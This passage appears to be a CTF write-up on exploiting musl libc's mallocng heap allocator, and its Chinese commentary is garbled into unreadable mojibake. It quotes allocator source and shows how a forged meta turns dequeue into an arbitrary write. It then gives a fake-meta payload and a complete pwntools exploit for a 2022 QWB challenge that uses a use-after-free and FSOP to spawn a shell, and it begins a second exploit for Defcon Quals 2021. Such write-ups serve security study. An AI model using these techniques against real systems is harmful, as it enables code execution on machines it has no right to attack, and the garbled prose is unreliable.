m-&gt;mem-&gt;active_idx = cnt-1; } } // å°† freed_mask è½¬ä¸º avail_mask mask = activate_group(m); assert(mask); decay_bounces(m-&gt;sizeclass); } first = mask&amp;-mask; m-&gt;avail_mask = mask-first; return first;} è‹¥ active ç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™å°†æ­¤ meta ä» active å’Œ é“¾è¡¨ä¸­ç§»å‡º å°† active ç¬¬ä¸€ä¸ª meta è®¾ç½®ä¸ºä¸‹ä¸€ä¸ª meta å°†å…¶ freed_mask è½¬ä¸º avail_mask ä½¿ç”¨ å– avail_mask ä¸­ idx æœ€å°çš„ chunk queue./src/malloc/mallocng/meta.h1234567891011121314static inline void queue(struct meta **phead, struct meta *m){ assert(!m-&gt;next); assert(!m-&gt;prev); if (*phead) { struct meta *head = *phead; m-&gt;next = head; m-&gt;prev = head-&gt;prev; m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m; } else { m-&gt;prev = m-&gt;next = m; *phead = m; }} dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} å¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™ alloc_group./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123static struct meta *alloc_group(int sc, size_t req){ size_t size = UNIT*size_classes[sc]; int i = 0, cnt; unsigned char *p; // ä¼˜å…ˆå¯»æ‰¾ freed_metaï¼Œå°†å…¶ä» ctx.free_meta_head ç§»é™¤ // è‹¥æ²¡æœ‰å°±ä» meta_area ä¸­æŒ‰åœ°å€ä»ä½åˆ°é«˜é¡ºåºå–ä¸€ä¸ª // å¦‚æœ meta_area æ»¡äº†ï¼Œåˆ™å†ç”³è¯·ä¸€ä¸ª meta_area // ä¼šå°† meta çš„ prevï¼Œnext ç½®é›¶ struct meta *m = alloc_meta(); if (!m) return 0; size_t usage = ctx.usage_by_class[sc]; size_t pagesize = PGSZ; int active_idx; /* è®¾ç½® cntï¼Œä¹Ÿå°±æ˜¯ group èƒ½å®¹çº³ chunk æœ€å¤§æ•°é‡ */ if (sc &lt; 9) { while (i&lt;2 &amp;&amp; 4*small_cnt_tab[sc][i] &gt; usage) i++; cnt = small_cnt_tab[sc][i]; } else { // lookup max number of slots fitting in power-of-two size // from a table, along with number of factors of two we // can divide out without a remainder or reaching 1. cnt = med_cnt_tab[sc&amp;3]; // reduce cnt to avoid excessive eagar allocation. while (!(cnt&amp;1) &amp;&amp; 4*cnt &gt; usage) cnt &gt;&gt;= 1; // data structures don't support groups whose slot offsets // in units don't fit in 16 bits. while (size*cnt &gt;= 65536*UNIT) cnt &gt;&gt;= 1; }/* end */ // If we selected a count of 1 above but it's not sufficient to use // mmap, increase to 2. Then it might be; if not it will nest. if (cnt==1 &amp;&amp; size*cnt+UNIT &lt;= pagesize/2) cnt = 2; // All choices of size*cnt are &quot;just below&quot; a power of two, so anything // larger than half the page size should be allocated as whole pages. if (size*cnt+UNIT &gt; pagesize/2) { // check/update bounce counter to start/increase retention // of freed maps, and inhibit use of low-count, odd-size // small mappings and single-slot groups if activated. int nosmall = is_bouncing(sc); account_bounce(sc); step_seq(); // since the following count reduction opportunities have // an absolute memory usage cost, don't overdo them. count // coarse usage as part of usage. if (!(sc&amp;1) &amp;&amp; sc&lt;32) usage += ctx.usage_by_class[sc+1]; // try to drop to a lower count if the one found above // increases usage by more than 25%. these reduced counts // roughly fill an integral number of pages, just not a // power of two, limiting amount of unusable space. if (4*cnt &gt; usage &amp;&amp; !nosmall) { if (0); else if ((sc&amp;3)==1 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 2; else if ((sc&amp;3)==2 &amp;&amp; size*cnt&gt;4*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;2*pagesize) cnt = 5; } size_t needed = size*cnt + UNIT; needed += -needed &amp; (pagesize-1); // produce an individually-mmapped allocation if usage is low, // bounce counter hasn't triggered, and either it saves memory // or it avoids eagar slot allocation without wasting too much. if (!nosmall &amp;&amp; cnt&lt;=7) { req += IB + UNIT; req += -req &amp; (pagesize-1); if (req&lt;size+UNIT || (req&gt;=4*pagesize &amp;&amp; 2*cnt&gt;usage)) { cnt = 1; needed = req; } } p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) { free_meta(m); return 0; } m-&gt;maplen = needed&gt;&gt;12; ctx.mmap_counter++; active_idx = (4096-UNIT)/size-1; if (active_idx &gt; cnt-1) active_idx = cnt-1; if (active_idx &lt; 0) active_idx = 0; } else { int j = size_to_class(UNIT+cnt*size-IB); // ä»å¤§ group ä¸­ç”³è¯·å° groupï¼Œå¤§ group çš„ chunk ä½œä¸ºæ•´ä¸ªå° groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹ int idx = alloc_slot(j, UNIT+cnt*size-IB); if (idx &lt; 0) { free_meta(m); return 0; } struct meta *g = ctx.active[j]; p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter); m-&gt;maplen = 0; p[-3] = (p[-3]&amp;31) | (6&lt;&lt;5); for (int i=0; i&lt;=cnt; i++) p[UNIT+i*size-4] = 0; active_idx = cnt-1; } // å¢åŠ å¯ç”¨ chunk ä¸ªæ•° ctx.usage_by_class[sc] += cnt; // åˆå§‹åŒ– meta å’Œ group m-&gt;avail_mask = (2u&lt;&lt;active_idx)-1; m-&gt;freed_mask = (2u&lt;&lt;(cnt-1))-1 - m-&gt;avail_mask; m-&gt;mem = (void *)p; m-&gt;mem-&gt;meta = m; // group çš„ active_idx å’Œ meta çš„ last_idx ä¸€èˆ¬æ˜¯ç›¸ç­‰çš„ï¼Œä¸º cnt-1 m-&gt;mem-&gt;active_idx = active_idx; m-&gt;last_idx = cnt-1; m-&gt;freeable = 1; m-&gt;sizeclass = sc; return m;} emframe./src/malloc/mallocng/meta.h123456789101112131415161718192021222324252627282930313233343536373839404142434445static inline void *enframe(struct meta *g, int idx, size_t n, int ctr){ // è·å– chunk å¤§å° size_t stride = get_stride(g); // è®¡ç®— chunk å¤šä½™ç©ºé—´ size_t slack = (stride-IB-n)/UNIT; // p æŒ‡å‘ chunk çš„ data èµ·å§‹ä½ç½® unsigned char *p = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = p+stride-IB; // cycle offset within slot to increase interval to address // reuse, facilitate trapping double-free./* check */ // p[-3] = chunk_idx // *(uint16_t *)(p-2) = chunk_offset // å– chunk çš„ offsetï¼Œä¸€èˆ¬ä¸º 0 int off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) &amp; 255; assert(!p[-4]); if (off &gt; slack) { size_t m = slack; m |= m&gt;&gt;1; m |= m&gt;&gt;2; m |= m&gt;&gt;4; off &amp;= m; if (off &gt; slack) off -= slack+1; assert(off &lt;= slack); } if (off) { // store offset in unused header at offset zero // if enframing at non-zero offset. *(uint16_t *)(p-2) = off; p[-3] = 7&lt;&lt;5; p += UNIT*off; // for nonzero offset there is no permanent check // byte, so make one. p[-4] = 0; }/* end */ // è®¾ç½® offset å’Œ idx *(uint16_t *)(p-2) = (size_t)(p-g-&gt;mem-&gt;storage)/UNIT; p[-3] = idx; // è®¾ç½® reserved set_size(p, end, n); return p;} æ€»ç»“ä¸€ä¸‹ä»¥ä¸‹ä¸ºä¸€èˆ¬æƒ…å†µçš„æµç¨‹ï¼Œçœç•¥äº†ç‰¹æ®Šæƒ…å†µ æ£€æŸ¥ç”³è¯·çš„ size å¦‚æœ size è¾¾åˆ°éœ€è¦ mmap çš„é˜ˆå€¼ ç›´æ¥è°ƒç”¨ mmapï¼Œè¿”å›çš„åœ°å€ä½œä¸º group è·å–å¹¶åˆå§‹åŒ– meta last_idx = 0ï¼Œåªæœ‰ä¸€ä¸ª chunkï¼Œå› æ­¤å®ƒä¸ä¼šå† ctx.active ä¸­ sizeclass = 63 maplen = (size + 4 + 0x10 + 4095) / 4096 avail_mask = freed_mask = 0 ctx.mmap_counter++ è¿›å…¥ success æ²¡æœ‰åˆ™è°ƒç”¨ size_to_class å°† size è®¡ç®—ä¸ºå¯¹åº”çš„ scï¼ˆsizeclassï¼‰ è·å–å¯¹åº”çš„ meta å– sc å¯¹åº”å¤§å°çš„å¯åˆ†é…çš„ metaï¼ˆctx.active[sc]) è‹¥ä¸å­˜åœ¨æ»¡è¶³ä¸‹åˆ—æ‰€æœ‰æ¡ä»¶ä¼šå–ç¨å¤§ä¸€ç‚¹çš„ meta 4&lt;= sc &lt;32 sc != 6 sc ä¸ºå¶æ•° å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0ï¼ˆæ²¡æœ‰å¯¹åº”å¤§å°çš„ metaï¼‰ è·å– chunk çš„ idx å– meta çš„ç¬¬ä¸€ä¸ª avail_chunk è‹¥ avail_chunk å­˜åœ¨ å°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶ è¿›å…¥ success è¿›å…¥ alloc_slot è¿›è¡Œè¿›ä¸€æ­¥ç”³è¯· è°ƒç”¨ try_avail å°è¯• ctx.active[sc] é“¾è¡¨ä¸­çš„æ‰€æœ‰ meta æ£€æŸ¥ç¬¬ä¸€ä¸ª meta çš„ freed_mask è‹¥ freed_mask ä¸º 0ï¼Œä¼šè°ƒç”¨ **dequeue**ï¼Œå°†å…¶ç§»é™¤ ctx.active[sc] å› ä¸ºç¬¬ä¸€ä¸ª meta æ²¡æœ‰ unuse_chunk å°†ä¸‹ä¸€ä¸ª meta åˆ‡æ¢ä¸ºç¬¬ä¸€ä¸ª metaï¼ˆctx.active[sc] = m-&gt;next) å°† meta çš„ freed_mask è½¬ä¸º avail_mask å– meta çš„ç¬¬ä¸€ä¸ª avail_chunkï¼Œå°† avail_mask ä¸Šå¯¹åº”çš„ä½ç½®ç½®é›¶ è¿”å›ç¬¬ä¸€ä¸ª avail_chunk å¯¹åº”çš„ avail_mask ä½ç½® æ³¨ï¼šä¸‹ä¸€ä¸ª meta å¯èƒ½æ˜¯å®ƒè‡ªå·±ï¼ˆå¾ªç¯ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ unused_maskï¼Œæœ€ç»ˆä¼šè¿”å› 0 å¦‚æœ try_avail è¿”å› 0ï¼Œä¼šè°ƒç”¨ alloc_group ç”³è¯·ä¸€ä¸ªæ–°çš„ group å…ˆè°ƒç”¨ alloc_meta ç”³è¯·ä¸€ä¸ª metaï¼Œä¼˜å…ˆå– freed_meta å†ä» meta_area ä¸­å–æ–°çš„ æ–°çš„ group ä¸€èˆ¬å–æ›´å¤§çš„ chunk ä½œä¸ºæ•´ä¸ª groupï¼Œæ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹ meta çš„ avail_mask å‡ä¸€ï¼Œå³ä½¿ç”¨ç¬¬ä¸€ä¸ª chunk è°ƒç”¨ queue å°† meta æ”¾å…¥ ctx.active[sc] è¿›å…¥ success è°ƒç”¨ enframe å¯¹ chunk åˆå§‹åŒ– (unsigned char*) p[-3] = idx *(uint16_t) (p - 2) = offset è®¾ç½® reserved æ€»ç»“ç®€å•ç‰ˆåˆ†é… chunk é¡ºåº ctx.active[sc] -&gt; avail_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ avail_chunk ctx.active[sc] -&gt; next -&gt; freed_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta çš„ ä¸‹ä¸€ä¸ª meta ä¸­çš„ freed_chunk å¦‚æœ ctx.active[sc] çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™ä¼šè°ƒç”¨ **dequeue**ï¼Œå°†å…¶ç§»å‡º active å’Œé“¾è¡¨ å…ˆæŠŠ freed_mask è½¬ä¸º avail_maskï¼Œç„¶åå°† ctx.active[sc] è®¾ä¸ºè¯¥ meta ctx.active[sc] -&gt; freed_mask malloc_context.active å¯¹åº”å¤§å°çš„ meta ä¸­çš„ freed_chunk new_meta -&gt; avail_mask ç”³è¯·ä¸€ä¸ªæ–°çš„ metaï¼Œå–å…¶ avail_chunk freefree./src/malloc/mallocng/free.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546void free(void *p){ if (!p) return; struct meta *g = get_meta(p); int idx = get_slot_index(p); size_t stride = get_stride(g); unsigned char *start = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = start + stride - IB; // æ£€æŸ¥ reserved get_nominal_size(p, end); uint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1; // idx å’Œ reserved ç½® 0xffï¼Œoffset ç½® 0 ((unsigned char *)p)[-3] = 255; // invalidate offset to group header, and cycle offset of // used region within slot if current offset is zero. *(uint16_t *)((char *)p-2) = 0; // release any whole pages contained in the slot to be freed // unless it's a single-slot group that will be unmapped. if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) { unsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1)); size_t len = (end-base) &amp; -PGSZ; if (len) madvise(base, len, MADV_FREE); } // atomic free without locking if this is neither first or last slot for (;;) { uint32_t freed = g-&gt;freed_mask; uint32_t avail = g-&gt;avail_mask; uint32_t mask = freed | avail; assert(!(mask&amp;self)); // å¦‚æœæ²¡æœ‰ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunkï¼Œåˆ™è·³å‡ºå¾ªç¯ if (!freed || mask+self==all) break; if (!MT) g-&gt;freed_mask = freed+self; else if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed) continue; return; } wrlock(); struct mapinfo mi = nontrivial_free(g, idx); unlock(); if (mi.len) munmap(mi.base, mi.len);} å¦‚æœå…¶ä»– chunk éƒ½ä¸æ˜¯ freed_chunk æˆ–è€…éƒ½æ˜¯ unuse_chunk åˆ™ä¼š è¿›å…¥ nontrivial_free nontrivial_free./src/malloc/mallocng/free.c1234567891011121314151617181920212223242526272829303132static struct mapinfo nontrivial_free(struct meta *g, int i){ uint32_t self = 1u&lt;&lt;i; int sc = g-&gt;sizeclass; uint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask; // ä¸€èˆ¬æƒ…å†µï¼Œåªè¦æ‰€æœ‰ chunk éƒ½æ˜¯ unuseï¼Œå°±ä¼š free meta å’Œ group if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) { // any multi-slot group is necessarily on an active list // here, but single-slot groups might or might not be. if (g-&gt;next) { assert(sc &lt; 48); int activate_new = (ctx.active[sc]==g); dequeue(&amp;ctx.active[sc], g); // å°†ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk if (activate_new &amp;&amp; ctx.active[sc]) activate_group(ctx.active[sc]); } return free_group(g); } else if (!mask) { // å¦‚æœ meta ä¸åœ¨ active é‡Œï¼Œåˆ™æ”¾å…¥ actvie ä¸­ assert(sc &lt; 48); // might still be active if there were no allocations // after last available slot was taken. if (ctx.active[sc] != g) { queue(&amp;ctx.active[sc], g); } } // g-&gt;freed_mask = g-&gt;free_mask &amp; self a_or(&amp;g-&gt;freed_mask, self); return (struct mapinfo){ 0 };} æ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk å°†è¯¥ meta ä» active å’Œé“¾è¡¨ä¸­ç§»é™¤ å°†é“¾è¡¨çš„ä¸‹ä¸€ä¸ª meta çš„ freed_chunk è½¬ä¸º avail_chunk free è¯¥ meta å’Œ group æ²¡æœ‰ freed_chunk å°†è¯¥ meta æ’å…¥ active çš„é“¾è¡¨å°¾éƒ¨ free_group./src/malloc/mallocng/free.c1234567891011121314151617181920212223static struct mapinfo free_group(struct meta *g){ struct mapinfo mi = { 0 }; int sc = g-&gt;sizeclass; if (sc &lt; 48) { ctx.usage_by_class[sc] -= g-&gt;last_idx+1; } if (g-&gt;maplen) { step_seq(); record_seq(sc); mi.base = g-&gt;mem; mi.len = g-&gt;maplen*4096UL; } else { void *p = g-&gt;mem; struct meta *m = get_meta(p); int idx = get_slot_index(p); g-&gt;mem-&gt;meta = 0; // not checking size/reserved here; it's intentionally invalid mi = nontrivial_free(m, idx); } free_meta(g); return mi;} æ€»ç»“ä¸€ä¸‹ è·å– chunk çš„ metaã€idxã€sc æ£€æŸ¥ reserved idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶ æ£€æŸ¥ avail_mask å’Œ freed_mask è‹¥å­˜åœ¨ freed_chunk ä¸”æœ‰å…¶ä»–çš„ inuse_chunk å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1 ç»“æŸ free å‡½æ•° å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ è°ƒç”¨ nontrivial_free å‡½æ•°åšè¿›ä¸€æ­¥å¤„ç† å¦‚æœæ‰€æœ‰ chunk éƒ½æ˜¯ unuse_chunk å¦‚æœ meta çš„ next å­˜åœ¨ï¼Œè°ƒç”¨ dequeue å°† meta ä» ctx.active[sc] ä¸­ç§»å‡º free æ‰ meta å’Œ group ç»“æŸ free å‡½æ•° å¦‚æœå…¶ä»– chunk éƒ½æ˜¯ inuse_chunk ä¸” meta ä¸åœ¨ ctx.artive[sc] ä¸­ è°ƒç”¨ queue å°† meta æ”¾å…¥ ctx.active[sc] å°† freed_mask ä¸Šè¯¥ chunk å¯¹åº”çš„ä½ç½®è®¾ä¸º 1 å…³é”®dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} å‡ ä¹æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œå¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™ è°ƒç”¨é€”å¾„ malloc -&gt; try_avail -&gt; dequeue free -&gt; nontrivial_free -&gt; dequeue åˆ©ç”¨ æ³„éœ²ä¸€äº›é‡è¦ä¿¡æ¯ å¤§éƒ¨åˆ†éƒ½å¯ä»¥ä» malloc_context ä¸­è·å– libc åŸºå€ secret ä¼ªé€  meta_areaã€areaã€groupã€chunk ä¸‹é¢æ˜¯ä¸€äº›ä¼ªé€ çš„ç¡¬æ€§è¦æ±‚æˆ–è€…å»ºè®® meta_area å› ä¸º get_meta æ—¶ä¼šæ£€æŸ¥ secret é˜²æ­¢ä¼ªé€ ï¼Œè€Œæ£€æŸ¥æ—¶å– meta_area åœ°å€æ˜¯å– area æ‰€åœ¨é¡µçš„åœ°å€ï¼Œå› æ­¤ä¼ªé€ çš„ meta_area åœ°å€å 12 ä½éƒ½è¦ä¸º 0ï¼Œä¸€èˆ¬é€šè¿‡ mmap ä¼ªé€  check == malloc_context.secret area prevï¼Œnext æ”¹æˆæƒ³å†™çš„ä½ç½® mem == fake_group last_idx == 0ï¼Œä¸€èˆ¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ª chunkï¼Œè¿™æ · free fake_chunk æ—¶ç›´æ¥èƒ½è¿›å…¥ nontrivial_free avail_maskï¼Œfreed_mask å…¨ä¸º 0 å³å¯ï¼ˆå› ä¸ºåªæœ‰ä¸€ä¸ªå°†è¦ free çš„ fake_chunkï¼‰ sc &lt; 48 freeable == 1 maplen != 0ï¼Œå¦åˆ™åœ¨ free_group ä¼šè¿›è¡Œé€’å½’ freeï¼Œéšä¾¿å–ä¸ªå€¼å°±è¡Œ group meta == fake_meta active_idx == 0 chunk ä¸€èˆ¬æ˜¯ fake_fike æˆ–è€…å…¶ä»–åƒåœ¾æ•°æ® ä¸‹é¢çš„ä¾‹å­æ˜¯å°† ofl_head æŒ‡å‘ fake_chunkï¼ˆfake_fileï¼‰ï¼Œexit æ—¶å°±å¯ä»¥å¯¼è‡´ FSOP 12345678910111213141516171819202122last_idx = 0freeable = 1sc = 8maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(maplen &lt;&lt; 12 | sc &lt;&lt; 6 | freeable &lt;&lt; 5 | last_idx)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)# fake_filefake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1) # nsolts 2022 qwb UserManagerè¿™é‡Œåªè¦ä¼šå †é£æ°´å°±è¡Œï¼Œä¸éœ€è¦ä¼ªé€ å°±å¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡ 12345678910111213141516171819202122232425262728void __fastcall insert(User *newUser, User *users){ while ( users ) { // UAF if ( newUser-&gt;id == users-&gt;id ) { newUser-&gt;flag = users-&gt;flag; newUser-&gt;leftUser = users-&gt;leftUser; newUser-&gt;rightUser = users-&gt;rightUser; newUser-&gt;parentUser = users-&gt;parentUser; if ( users-&gt;leftUser ) users-&gt;leftUser-&gt;parentUser = newUser; if ( users-&gt;rightUser ) users-&gt;rightUser-&gt;parentUser = newUser; if ( users-&gt;parentUser != (User *)0xDEADBEEFLL ) { if ( users == users-&gt;parentUser-&gt;leftUser ) users-&gt;parentUser-&gt;leftUser = newUser; else users-&gt;parentUser-&gt;rightUser = newUser; } free(users-&gt;name); free(users); return; } ...} åœ¨æ·»åŠ  user çš„æ—¶å€™ï¼Œå¦‚æœæœ‰ id ç›¸åŒçš„ userï¼Œä¼šæŠŠåŸæ¥çš„ user é‡Šæ”¾æ‰ï¼Œä½†æ˜¯ users ä¼šæŒ‡å‘åŸæ¥çš„ userï¼Œé€ æˆ UAF å…ˆæ³„éœ²å‡º libc å’Œ elf åœ°å€ ä¸Šé¢çš„ç¬¬ 13 è¡Œå¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡ï¼ŒæŠŠ ofl_head ä¿®æ”¹åˆ°å¯æ§ä½ç½® ä¼ªé€  fake_file æœ€å exit è¿›è¡Œ FSOP æœ€åå†™ fake_file çš„æ—¶å€™è¦å¤šæ¬¡å †é£æ°´ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *# p = remote('', )p = process('./' + __file__[0:-3])context(arch='amd64', os='linux', log_level='debug')elf = ELF(__file__[0:-3])libc = ELF(&quot;./libc.so&quot;)addr_insert = elf.sym[&quot;insert&quot;]def add(id, length, name): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id)) p.recvuntil(b&quot;length: &quot;) p.sendline(str(length)) p.recvuntil(b&quot;UserName: &quot;) p.send(name)def check(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def delete(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def clear(): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;4&quot;)def fengshui(times=1, length=0x8, name=&quot;aaad\\n&quot;, id=0): for _ in range(times): add(id, length, name) id += 1# gdb.attach(p)## leak addradd(0x100, 0x38, &quot;aaad\\n&quot;) # usersadd(0x100, 0x8, &quot;aaad\\n&quot;)fengshui(6)check(0x100)addr_elf = u64(p.recv(0x10)[-8:]) - 0x5ca0addr_libc = u64(p.recv(0x20)[-8:]) - 0xb7d60print(&quot;-&gt; addr_elf = &quot;, hex(addr_elf))print(&quot;-&gt; addr_libc = &quot;, hex(addr_libc))addr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xb6e48## write ofl_head to fake_fileclear()add(0x6873, 0x38, &quot;aaad\\n&quot;) # usersadd(0x6873, 0x8, &quot;aaad\\n&quot;)fengshui(6)fake_user = p64(0x6873) + p64(addr_libc + 0xb7a60) + p64(0) + p64(1) fake_user += p64(0xdeadbeef) + p64(addr_ofl_head - 0x20) + p64(0)add(0x6873, 0x38, fake_user) # user-&gt;name --&gt; users## construct fake_fileclear()# gdb.attach(p)add(0x6873, 0x38, p64(addr_system) * 7) # ofl_head[0] = &quot;sh&quot;add(0x100, 0x8, &quot;aaad\\n&quot;)add(0x100, 0x38, p64(0) * 7) # ofl_head-&gt;lock = 0fengshui(3)add(0x50, 0x38, p64(addr_system) * 7) # ofl_head-&gt;write = systemp.sendline()p.interactive() Defcon Quals 2021 moooslç”¨çš„æœ¬åœ° libcï¼Œmusl 1.2.2-4 amd64 é™æ€åˆ†æä¸€ä¸ªå…¸å‹çš„èœå•é¢˜ï¼Œå­˜å‚¨ KV 12345678struct KV { char *key; char *value; __int64 key_size; __int64 value_size; __int64 hash; KV *next_KV;}; store æ¯æ¬¡å­˜å‚¨ä¸€ä¸ª KVï¼Œå†ç”³è¯· key å’Œ value å†…å­˜ï¼Œè®¡ç®— key çš„ hashï¼Œå– hash å 12 ä½å°†å…¶æ”¾å…¥ hash_map ä¸­ï¼Œç”¨å•é“¾è¡¨å­˜å‚¨ hash å 12 ä½ç›¸åŒçš„ KVï¼Œå¤´æ’æ³• å¯ç”¨äºå †é£æ°´ query å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¾“å‡º value å†…å®¹ï¼Œæœ€åå°† key å†…å­˜ free å¯ç”¨äº å †é£æ°´ delete å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¿›è¡Œåˆ é™¤ 12345678910111213141516kv = search(key, key_size);if ( kv ){ chain = &amp;hash_map[kv-&gt;hash &amp; 0xFFF]; // è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªæ¡ä»¶ï¼Œå½“ kv æ˜¯é“¾è¡¨å°¾çš„æ—¶å€™ï¼Œä¸Šä¸€ä¸ª kv çš„ next_KV æ²¡æœ‰ç½®é›¶ï¼Œå¯¼è‡´ UAF if ( kv == *chain || kv-&gt;next_KV ) { while ( kv != *chain ) chain = &amp;(*chain)-&gt;next_KV; *chain = kv-&gt;next_KV; } free(kv-&gt;key); free(kv-&gt;value); free(kv); puts(&quot;ok&quot;);} åˆ©ç”¨ç‚¹ ç”³è¯·ä¸¤ä¸ª hash å 12 ä½ç›¸åŒçš„ kvï¼Œdelete åé¢ä¸€ä¸ªé€ æˆ UAF é€šè¿‡å †é£æ°´å’Œ query æ³„éœ²å‡ºé‡è¦ä¿¡æ¯ å†é€šè¿‡å †é£æ°´å’Œ deleteï¼Œä¼ªé€  meta_areaï¼Œé€šè¿‡ unsafe_unlink ä»»æ„åœ°å€å†™ ä¸»è¦æ˜¯é€šè¿‡ delete çš„ free(kv-&gt;key) æˆ– free(kv-&gt;value) æ¥ unlink å› ä¸ºè¿™ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥ä»»æ„å†™ï¼ˆç¬”è€…æƒ³äº†å¥½ä¹…æ­»æ´»æ²¡æƒ³å‡ºæ¥ï¼‰ é€šè¿‡æ”¹å†™ ofl_head æŒ‡å‘ä¼ªé€ çš„ file æœ€å exit å¯¼è‡´ FSOP ä¸‹é¢æ˜¯çœ‹åˆ«äºº wp æ˜¯åšæ³•ï¼Œè¦å†™ä¸‰æ¬¡ï¼Œä¼ªé€ ä¸‰æ¬¡ï¼ˆé€†å¤©ï¼‰ é€šè¿‡æ”¹å†™ stdout çš„ write å‡½æ•°æŒ‡é’ˆä¸º system å’Œ flags ä¸º /bin/sh\\x00ï¼Œå¹¶ä½¿ wpos != wbase å³å¯å¯¼è‡´ FSOP æ‹¿åˆ° shell æ€è·¯å¾ˆç®€å•ï¼Œä½†æ˜¯ exp æ˜¯çœŸçš„éš¾å†™ğŸ˜­ğŸ˜­ exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169from pwn import *context(arch='amd64', os='linux', log_level='debug')address = &quot;&quot;.split(':')filename = &quot;./&quot; + __file__[0:-3]elf = ELF(__file__[0:-3])# p = remote(address[0], address[1])p = process(__file__[0:-3])libc = ELF(&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;)def store(key, value, key_size=None, value_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key) p.recvuntil(b&quot;size: &quot;) if value_size == None : value_size = len(value) p.sendline(str(value_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(value)def query(key, key_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;size: 